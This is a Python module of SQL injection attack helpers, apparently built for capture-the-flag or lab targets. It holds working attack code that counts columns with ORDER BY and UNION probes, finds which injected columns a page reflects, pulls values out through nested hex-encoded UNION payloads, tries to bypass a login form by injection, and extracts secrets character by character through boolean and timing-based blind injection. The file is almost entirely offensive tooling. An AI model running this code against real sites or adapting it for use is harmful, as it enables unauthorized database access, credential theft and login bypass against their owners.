from bs4 import BeautifulSoup
import difflib
import re
import time
from typing import Callable
from itertools import compress
from connect import my_request as req


def find_error(url: str, param: str, cook: dict) -> str:
    html_response = req.get_request(url, param, cook).replace(
        '<b>', '').replace('</b>', '').replace('\n', '')
    soup = BeautifulSoup(html_response, 'html.parser')
    war = soup.find_all(string=re.compile("Warning"))
    return war


def none_func(s: str) -> str:
    return s


def count_columns(url: str, data: dict, cook={}, encode=none_func, method='get', sqli='order') -> int:
    '''
    Counting the number of columns that must be passed in the request 
    for a successful call.
    The request is transmitted via get (param), the response is the content of the web page.
    Тhe function compares responses from two consecutive requests 
    and checks the difference in them.

    max_columns: еstimated maximum number of columns
    html_response_1, html_response_2: response from the web page
    '''

    max_columns = 30
    html_response_1 = ''
    payload = [(k, v) for k, v in data.items() if '%s' in v]
    if sqli == 'union':
        list_of_columns = [str(c + 1) * 3 for c in range(max_columns)]
    # ToDo for multiply %
    for i in range(1, max_columns):
        if sqli == 'order':
            pl = payload[0][1] % str(i)
        elif sqli == 'union':
            testing_list = list_of_columns[:i]
            pl = payload[0][1] % (','.join(testing_list))
        if encode != none_func:
            print(pl)
            pl = encode(pl)
        data[payload[0][0]] = pl

        if method == 'get':
            html_response_2 = req.get_request(url, data, cook)
        elif method == 'post':
            html_response_2 = req.post_request(url, data, cook)
        else:
            print('request method is not understanding')
            return False

        # Deleting form content
        html_response_2 = html_response_2[:html_response_2.find('<form')] + \
            html_response_2[html_response_2.find('/form>') + 6:]

        if sqli == 'order':
            for s in difflib.ndiff(html_response_2, html_response_1):
                if i > 1 and ('+' in s[0] or '-' in s[0]):
                    print('num of columns: ', i - 1)
                    return i - 1
                html_response_1 = html_response_2
        elif sqli == 'union':
            if 'error' not in html_response_2:
                print('num of columns: ', i)
                return i

    print('num of columns not find')
    return False


def find_visible_columns_and_param(url: str, columns: int, data: dict, finds: list,
                                   cook={}, encode=none_func, method='get', type_sqli=1,
                                   internal_payload='') -> list:
    '''
    The function finds the columns displayed on the web page after request
    '''

    payload = [(k, v) for k, v in data.items() if '%s' in v]

    list_of_columns = [str(c + 1) * 3 for c in range(columns)]
    print('list of columns: ', list_of_columns)

    if type_sqli == 2:
        pl = internal_payload % (','.join(list_of_columns))
        hex_internal = '0x' + pl.encode('utf-8').hex()

    for position in range(len(list_of_columns)):
        list_external = list_of_columns.copy()
        if type_sqli == 2:
            list_external[position] = hex_internal

        pl = payload[0][1] % (','.join(list_external))
        if encode != none_func:
            print(pl)
            pl = encode(pl)
        data[payload[0][0]] = pl

        if method == 'get':
            html_visible = req.get_request(url, data, cook)
        elif method == 'post':
            html_visible = req.post_request(url, data, cook)
        else:
            print('request method is not understanding')
            return False

        list_of_visible = [
            text for text in list_of_columns if text in html_visible]

        if list_of_visible:
            print('visible columns: ', list_of_visible)
            break
        else:
            if type_sqli == 1 or position == len(list_of_columns) - 1:
                print('not find visible column')
                return False

    # Deleting form content
    html_visible = html_visible[:html_visible.find('<form')] + \
        html_visible[html_visible.find('/form>') + 6:]

    # Find param
    keys = []
    for field in finds:
        if type_sqli == 2:
            list_internal = [field for c in range(columns)]
            pl = internal_payload % (','.join(list_internal))
            hex_internal = '0x' + pl.encode('utf-8').hex()

        list_external = [field for c in range(columns)]
        if type_sqli == 2:
            list_external[position] = hex_internal

        pl = payload[0][1] % (','.join(list_external))
        if encode != none_func:
            print(pl)
            pl = encode(pl)
        data[payload[0][0]] = pl

        if method == 'get':
            html_response = req.get_request(url, data, cook)
        elif method == 'post':
            html_response = req.post_request(url, data, cook)
        else:
            print('request method is not understanding')
            return False

        # Deleting form content
        html_response = html_response[:html_response.find('<form')] + \
            html_response[html_response.find('/form>') + 6:]

        # Find differens
        index = 0
        key = []
        while html_response[index] == html_visible[index]:
            index += 1
        new_index = index
        # + 3 because 111,222 etc in request
        while html_response[new_index] != html_visible[index + 3]:
            key.append(html_response[new_index])
            new_index += 1
        print('key: ', ''.join(key))
        keys.append(''.join(key))

        # testing for end
        if len(html_response[new_index:]) > len(html_visible[index:]):
            print('not end')
            # ToDo Find all words which contains in html_response[] and
            # not contains in html_visible[]

    return keys


def try_auth(url: str, columns: int, data: str,
             finds: str, cook={}) -> str:
    '''
    Тry to log in if we know the number of columns and what we write in them.
    '''
    list_of_columns = [str(c + 1) * 3 for c in range(columns)]
    payload = [(k, v) for k, v in data.items() if '%s' in v]
    for i in range(columns):
        data_dict = data.copy()
        tmp = list_of_columns[i]
        list_of_columns[i] = finds
        pl = payload[0][1] % (','.join(list_of_columns))
        data_dict[payload[0][0]] = pl

        response = req.post_request(url, data_dict, cook)
        if 'Login successful' in response:
            return response
        list_of_columns[i] = tmp
    print('auth not success')
    return False


def find_key_len(url: str, payload: dict, check_func: Callable, cook={},
                 method='get', print_resp=False) -> int:
    left = -1
    right = 32
    payload_tmp = payload.copy()
    while right > left + 1:
        middle = (left + right) // 2
        for k, v in sorted(payload.items()):
            if '%s' in v:
                payload_tmp[k] = v % middle
        t1 = time.time()
        response = req.my_request(
            url, payload_tmp, cook, method, print_resp, 1)
        t2 = time.time()
        if check_func(response, t1, t2):
            left = middle
        else:
            right = middle
    return right


def find_binary(url: str, payload: str,
                p: str, m_row: str, left: int, right: int, len_of_key: int, cook={}) -> int:
    result = ''
    for i in range(1, len_of_key + 1):
        a = left
        b = right
        while b - a != 0:
            middle = a + (b - a) // 2 + 1
            param = {p: payload % (i, f'<{middle},1,0)')}
            response = req.get_request(url, param, cook)
            if m_row in response:
                b = middle - 1
            else:
                a = middle
        print(chr(a))
        result += chr(a)
    return result


def extract_pass(response: str, pass_r: str) -> str:
    soup = BeautifulSoup(response.replace('<b>', ''), 'html.parser')
    print(soup.find_all(string=re.compile("flag")))
    passw = soup.find(string=re.compile(pass_r))
    return passw




